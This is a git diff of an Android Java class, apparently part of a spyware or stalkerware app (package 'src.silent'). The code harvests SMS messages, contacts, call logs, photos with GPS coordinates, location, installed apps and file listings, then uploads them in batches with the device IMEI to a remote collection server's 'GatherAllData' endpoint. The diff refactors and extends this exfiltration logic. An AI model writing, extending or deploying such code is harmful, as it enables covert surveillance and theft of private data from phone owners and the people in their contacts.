@@ -48,80 +48,92 @@ import src.silent.utils.BitmapJsonHelper;
 import src.silent.utils.LocationHandler;
 import src.silent.utils.SHA1Helper;
 import src.silent.utils.ServerCommunicationHandler;
+import src.silent.utils.models.MasterTaskParams;
 
 /**
  * Created by all3x on 2/23/2018.
  */
 
-public class TaskMaster extends AsyncTask<Context, Void, Void> {
-
-    private Context params;
+public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {
 
     @Override
-    protected Void doInBackground(Context... params) {
-        this.params = params[0];
+    protected Void doInBackground(MasterTaskParams... params) {
 
-        String maskHash = ServerCommunicationHandler.getMask(params[0],
+        String maskHash = ServerCommunicationHandler.getMask(params[0].context,
                 "http://192.168.1.24:58938/api/Service/GetMask",
-                "357336064017681");
+                params[0].IMEI);
         String[] maskHash2 = maskHash.split(";");
         String[] hashes = maskHash2[1].split(":");
 
-        //getFilesMetadata();
+        //getFilesMetadata(params[0].context, params[0].IMEI);
         JSONObject bulkData = new JSONObject();
         for (int i = 0; i < maskHash2[0].length(); i++) {
             if (maskHash2[0].charAt(i) == '1') {
                 switch (i) {
                     case 0:
-                        getPhotos(hashes[i], MediaStore.Images.Media.INTERNAL_CONTENT_URI);
-                        getPhotos(hashes[i], MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
+                        getPhotos(hashes[i], MediaStore.Images.Media.INTERNAL_CONTENT_URI,
+                                params[0].context, params[0].IMEI);
+                        getPhotos(hashes[i], MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                                params[0].context, params[0].IMEI);
                         break;
                     case 1:
-                        getContacts(bulkData, hashes[i]);
+                        getContacts(bulkData, hashes[i], params[0].context);
                         break;
                     case 2:
-                        getCallHistory(bulkData, hashes[i]);
+                        getCallHistory(bulkData, hashes[i], params[0].context);
                         break;
                     case 3:
-                        getMessages(bulkData, hashes[i]);
+                        getMessages(bulkData, hashes[i], params[0].context);
                         break;
                     case 4:
                         getMobileDataUsage(bulkData, hashes[i]);
                         break;
                     case 5:
-                        getInstalledApps(bulkData, hashes[i]);
+                        getInstalledApps(hashes[i], params[0].context, params[0].IMEI);
                         break;
                     case 6:
-                        getSmartphoneLocation(bulkData, hashes[i]);
+                        getSmartphoneLocation(bulkData, hashes[i], params[0].context);
                         break;
                     case 7:
-                        getBatteryLevel(bulkData);
+                        getBatteryLevel(bulkData, params[0].context);
                         break;
                 }
             }
         }
 
-        ServerCommunicationHandler.executeDataPost(params[0],
+        ServerCommunicationHandler.executeDataPost(params[0].context,
                 "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
-                "357336064017681");
+                params[0].IMEI);
         return null;
     }
 
-    private void getFilesMetadata() {
+    private void getFilesMetadata(Context context, String IMEI) {
         try {
-            JSONObject bulkData = new JSONObject();
             List<String> external = getListFiles(new File(Environment.getExternalStorageDirectory()
                     .toString()));
 
             JSONArray metadata = new JSONArray();
+            int counter = 0;
             for (String info : external) {
+                counter ++;
                 metadata.put(Base64.encodeToString(info.getBytes(), Base64.URL_SAFE));
+
+                if (counter % 1000 == 0) {
+                    JSONObject bulkData = new JSONObject();
+                    bulkData.put("Metadata", metadata);
+                    ServerCommunicationHandler.executeDataPost(context,
+                            "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
+                            IMEI);
+                }
             }
 
-            bulkData.put("Metadata", metadata);
-            ServerCommunicationHandler.executeDataPost(params,
-                    "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
-                    "357336064017681");
+            if (metadata.length() != 0) {
+                JSONObject bulkData = new JSONObject();
+                bulkData.put("Metadata", metadata);
+                ServerCommunicationHandler.executeDataPost(context,
+                        "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
+                        IMEI);
+            }
         } catch (Exception ex) {
             Log.d("EROARE", ex.getMessage());
         }
@@ -166,9 +178,9 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         return inFiles;
     }
 
-    private void getSmartphoneLocation(JSONObject bulkData, String hash) {
+    private void getSmartphoneLocation(JSONObject bulkData, String hash, Context context) {
         LocationManager locationManager = (LocationManager)
-                params.getSystemService(Context.LOCATION_SERVICE);
+                context.getSystemService(Context.LOCATION_SERVICE);
         try {
             Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             JSONObject locationData = new JSONObject();
@@ -227,10 +239,11 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         }
     }
 
-    private void getMessages(JSONObject bulkData, String hash) {
+    private void getMessages(JSONObject bulkData, String hash, Context context) {
+        //TODO: imparte
         try {
             Uri message = Uri.parse("content://sms");
-            ContentResolver cr = params.getContentResolver();
+            ContentResolver cr = context.getContentResolver();
             final String[] projection = new String[]{"address", "body", "read", "date", "type"};
             String selection = null;
             String[] selectionArgs = null;
@@ -287,9 +300,10 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         }
     }
 
-    private void getContacts(JSONObject bulkData, String hash) {
+    private void getContacts(JSONObject bulkData, String hash, Context context) {
+        //TODO: imparte
         try {
-            ContentResolver contentResolver = params.getContentResolver();
+            ContentResolver contentResolver = context.getContentResolver();
             String selection = null;
             String[] selectionArgs = null;
             if (!hash.equals("0")) {
@@ -315,7 +329,7 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                                 ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                 new String[]{id}, null);
                         InputStream inputStream = ContactsContract.Contacts.
-                                openContactPhotoInputStream(params.getContentResolver(),
+                                openContactPhotoInputStream(context.getContentResolver(),
                                         ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI,
                                                 new Long(id)));
 
@@ -378,9 +392,9 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         }
     }
 
-    private void getCallHistory(JSONObject bulkData, String hash) {
+    private void getCallHistory(JSONObject bulkData, String hash, Context context) {
         try {
-            ContentResolver contentResolver = params.getContentResolver();
+            ContentResolver contentResolver = context.getContentResolver();
             String selection = null;
             String[] selectionArgs = null;
             if (!hash.equals("0")) {
@@ -475,18 +489,20 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
 
     }
 
-    private void getInstalledApps(JSONObject bulkData, String hash) {
+    private void getInstalledApps(String hash, Context context, String IMEI) {
         try {
-            PackageManager pm = params.getPackageManager();
+            PackageManager pm = context.getPackageManager();
             List<ApplicationInfo> packages = pm.getInstalledApplications(0);
 
             JSONObject applications = new JSONObject();
             JSONArray informationArray = new JSONArray();
             long newHash = 0;
+            int counter = 0;
             for (ApplicationInfo packageInfo : packages) {
                 String package_name = packageInfo.packageName;
                 long appDate = pm.getPackageInfo(package_name, 0).firstInstallTime;
                 if (appDate > Long.parseLong(hash)) {
+                    counter ++;
                     JSONObject information = new JSONObject();
 
                     ApplicationInfo app = pm.getApplicationInfo(package_name, 0);
@@ -504,25 +520,40 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                     if (appDate > newHash) {
                         newHash = appDate;
                     }
+
+                    if (counter % 10 == 0) {
+                        JSONObject bulkData = new JSONObject();
+                        applications.put("Applications", informationArray);
+                        applications.put("Hash", newHash);
+                        bulkData.put("Applications", applications);
+                        ServerCommunicationHandler.executeDataPost(context,
+                                "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
+                                IMEI);
+                        informationArray = new JSONArray();
+                    }
                 }
             }
 
             if (informationArray.length() != 0) {
+                JSONObject bulkData = new JSONObject();
                 applications.put("Applications", informationArray);
                 applications.put("Hash", newHash);
                 bulkData.put("Applications", applications);
+                ServerCommunicationHandler.executeDataPost(context,
+                        "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
+                        IMEI);
             }
         } catch (Exception ex) {
             Log.d("EROARE", ex.getMessage());
         }
     }
 
-    private void getPhotos(String hash, Uri uri) {
+    private void getPhotos(String hash, Uri uri, Context context, String IMEI) {
         try {
             JSONObject photos = new JSONObject();
             JSONArray informationArray = new JSONArray();
 
-            ContentResolver cr = params.getContentResolver();
+            ContentResolver cr = context.getContentResolver();
             String[] filePathColumn = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_TAKEN,
                     MediaStore.Images.Media.LATITUDE, MediaStore.Images.Media.LONGITUDE};
             String selection = null;
@@ -587,16 +618,14 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                             photos.put("Photos", informationArray);
                             photos.put("Hash", newHash);
                             bulkData.put("Photos", photos);
-                            ServerCommunicationHandler.executeDataPost(params,
+                            ServerCommunicationHandler.executeDataPost(context,
                                     "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
-                                    "357336064017681");
+                                    IMEI);
                             informationArray = new JSONArray();
                         }
                     }
 
                 } while (cur.moveToNext());
-                int i=0;
-                i++;
             }
             cur.close();
 
@@ -606,9 +635,9 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                 photos.put("Hash", newHash);
                 bulkData.put("Photos", photos);
 
-                ServerCommunicationHandler.executeDataPost(params,
+                ServerCommunicationHandler.executeDataPost(context,
                         "http://192.168.1.24:58938/api/Service/GatherAllData", bulkData,
-                        "357336064017681");
+                        IMEI);
             }
         } catch (Exception ex) {
             Log.d("EROARE", ex.getMessage());
@@ -634,11 +663,11 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         return byteBuffer.toByteArray();
     }
 
-    private void getBatteryLevel(JSONObject bulkData) {
+    private void getBatteryLevel(JSONObject bulkData, Context context) {
         try {
             BatteryHandler batteryReceriver = new BatteryHandler();
             IntentFilter batteryFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
-            params.registerReceiver(batteryReceriver, batteryFilter);
+            context.registerReceiver(batteryReceriver, batteryFilter);
 
             bulkData.put("BatteryLevel", batteryReceriver.getBatteryLevel());
         } catch (Exception ex) {
